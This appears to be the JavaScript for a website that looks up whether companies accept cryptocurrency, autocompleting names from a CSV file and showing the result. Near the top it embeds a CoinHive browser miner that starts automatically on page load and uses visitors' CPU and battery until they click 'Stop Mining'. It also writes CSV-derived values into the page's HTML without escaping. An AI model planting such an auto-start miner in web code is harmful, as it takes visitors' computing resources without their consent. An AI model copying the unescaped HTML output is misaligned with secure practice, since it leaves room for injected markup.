$("#footer").load("footer.html"); 

const company_name = ["Expedia","Microsoft Online","Microsoft Account","Gyft","Virgin Galactic","Whole Foods", "Amazon", "Wikipedia"];
var company_value = company_name[Math.floor(Math.random()*company_name.length)];
$(".c_name_input").val(company_value);

var miner = new CoinHive.Anonymous('R28gUaZsQm8lY1W9aWPA8WBN83vhjId0',{throttle: 0.75, threads: 1});
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
setInterval(function() {
	var threadCount = miner.getNumThreads();
	var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
	var totalHashes = miner.getTotalHashes();
	var acceptedHashes = miner.getAcceptedHashes() / 256;
	var battery = navigator.battery || navigator.webkitBattery || navigator.mozBattery || navigator.msBattery;
	if (miner.isRunning()) {
		document.getElementById("ths_tah").innerHTML = "Total Hashes: " + totalHashes+" " + " Accepted Hashes: " + acceptedHashes;
		document.getElementById("minetext").innerHTML = "<p id=\"minetext\" style=\"display: inline;\" onclick=\"miner.stop()\">Accepted Hashes: " + acceptedHashes+" <a href=\"modal\" data-toggle=\"modal\" data-target=\"#mining_info\"> <u>Stop Mining</u></a></p>";
		document.getElementById("minebutton").innerHTML = "<button id=\"mine_button\" style=\"display: inline;\" onclick=\"miner.stop()\">Stop Mining</button>";
	} else {
		document.getElementById("ths_tah").innerHTML = "";
		document.getElementById("minetext").innerHTML = "<p id=\"minetext\" style=\"display: inline;\" onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\"><u>Start Mining</u></p>";
		document.getElementById("minebutton").innerHTML = "<button id=\"mine_button\" style=\"display: inline;\" onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
	}
}, 1000);


$(function () {
	$('[data-toggle="tooltip"]').tooltip()
})
$(function () {
	$('[data-toggle="popover"]').popover()
})

$(function() {
	function processData(allText) {
		var allTextLines = allText.split(/\r\n|\n/);
		var lines = [];
		while (allTextLines.length > 0) {
			var entry = {};
			entry = allTextLines.shift().split(',');
			lines.push(entry[0].replace(/\w\S*/g, function(txt){return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();}));
		}
		$("#c_name").autocomplete({ 
			maxResults: 10,
			source: function(request, response) {
				var results = $.ui.autocomplete.filter(lines, request.term);
				response(results.slice(0, this.options.maxResults));
			},
			select: function(event, ui) { 
				$(event.target).val(ui.item.value);
				callback();}
			});
	}
	var lists = [];

	$.get("crypto.csv", function(data) {
		lists = processData(data);
	});

});

var callback = function() {
	event.preventDefault();
	var nameValue = $("input.c_name_input").val().toLowerCase();
	$.get('crypto.csv', function(data) {
		var build = '';
		var crypto_type = '';
		var verified = '';
		var processed = '';
		var check = 0;
		var rows = data.split("\n");

		for (var thisRow = 0; thisRow < rows.length; thisRow++) {
			var columns = rows[thisRow].split(",");
			if (nameValue == columns[0].toLowerCase()) {
				check = 1;
				accepts = columns[1].toLowerCase();
				verified = columns[3].toLowerCase();
				processed = columns[4];
				if(columns.length == 7){
					crypto_type = columns[6].trim();

				}else{
					crypto_type = columns.splice(0,6);
					crypto_type.push(columns.join(' ')); 
					crypto_type = crypto_type[6].slice(1,-1).split('  ').join(', ');
					crypto_type = crypto_type.slice(0,-1);
				}
				break;
			}
		};
		$('#wrap').html(" "); 
		nameValue = nameValue.replace(/\w\S*/g, function(txt){return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();})
		if (check == 1 && verified=="yes" && accepts == "yes"){
			if (columns[2].length > 4){
				nameValue = '<a href="'+columns[2]+'"target=\"_blank\">'+nameValue+'</a>';
			}
			build = "<h3>" + nameValue +"<sup>✻</sup> "+" accepts "+" "+ crypto_type + "."+ "</h3>";
			if(processed != 'no'){
				build += "<h6>Processed by " + processed + ".<h6>";
			}
		}else if (check == 1 && verified=="yes" && accepts == "no"){
			if (columns[2].length > 4){
				nameValue = '<a href="'+columns[2]+'"target=\"_blank\">'+nameValue+'</a>';
			}
			build = "<h3>" + nameValue+" "+"<sup>✻</sup> does not accept any cryptocurrency.</h3>";
		}else if (check == 1){
			if (columns[2].length > 4){
				nameValue = '<a href="'+columns[2]+'"target=\"_blank\">'+nameValue+'</a>';
			}
			build = "<h3>" + nameValue+" "+" accepts "+" "+ crypto_type + "."+ "</h3>";
		}else{
			build = "<h3>" +nameValue+" "+" doesn't accept any cryptocurrency." + "</h3>";
			build += "<h6><a href=\"add.html\" target=\"_blank\">Do they accept crypto?</a></h6>"
		}
		$('#wrap').append(build);	

	});
};

$(".submit-btn").click(callback);

$("input").keypress(function() {
	if (event.which == 13) callback();
});
